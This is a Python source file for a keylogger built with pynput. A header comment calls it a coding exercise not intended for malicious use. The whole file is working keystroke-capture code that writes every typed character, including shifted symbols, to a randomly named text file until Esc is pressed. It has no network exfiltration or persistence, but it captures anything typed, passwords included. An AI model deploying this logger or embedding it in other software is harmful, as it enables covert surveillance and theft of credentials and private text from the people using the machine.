'''
This program is written as a coding exercise, and is not intended to be used maliciously.
Created by 4ist, 28 December 2018

'''

from pynput.keyboard import Key, Listener
import random
import string

class Logger:
    def __init__(self):

        self.fileName = self.randomName()   
        self.file = open(self.fileName,'w')
        self.shift = False
        
    
    def randomName(self):
        '''
        generate a random filename, ending in .txt
        input:   none
        returns: string
        '''
        randInt = random.randrange(6, 10)
        return ''.join(random.choices(string.ascii_uppercase + string.digits, k = randInt)) + ".txt"
            
    
    def on_press(self, key):
        '''
        determine what key pressed and write it to the file
        input:   key press object from Listener
        returns: none
        '''
        
        event = str(key)
        file = self.file
        
        # check if shift held
        if event == "Key.shift":
            self.shift = True
        
        # check if event is character
        if (event[0],event[2]) == ("'", "'"):
            
            # write caps if shift held
            if self.shift:
                
                # calls toCaps to see if non alphabet char
                if event[1].isalpha():
                    file.write(event[1].capitalize())
                    
                else:
                    file.write(self.toCaps(event[1]))
            else:
                file.write(event[1])
                
        # check if event is whitespace or similar
        else: 
            d = {
                "Key.space": " ",
                "Key.enter" : "\n",
                "Key.backspace": "¬" # "¬" is a placeholder symbol for backspace, as I don't know how to delete data from a txt
                }
            if event in d:
                file.write(d[event])

    def on_release(self, key):
        '''
        determine what key was released and update accordingly
        input:   key release object from Listener
        returns: False (iff esc key released)
        '''
        
        # check if shift done
        if str(key) == "Key.shift":
            self.shift = False
            
        # if esc, end write and close
        if key == Key.esc:
            self.file.close()
            return False
    
    def toCaps(self, x):
        '''
        converts non-alphabetic character to it's shift-held counterpart 
        input:   string char (example: "1", "[", or "/")
        returns: string char (example: "!", "{", or "?")
        '''
        # index of the following strings match 1:1 to keyboard counterparts
        lower = '''`1234567890-=[]\;',./'''
        upper = '''~!@#$%^&*()_+{}|:"<>?'''
        
        for i in range(len(lower)):
            
            if lower[i] == x:
                
                return upper[i]
    
    def main(self):
        '''
        start a listener for key presses and releases.
        runs until esc key is pressed
        '''
        
        with Listener(
                on_press=self.on_press,
                on_release=self.on_release) as listener:
            listener.join()
        

# main method call 
myLog = Logger()
myLog.main()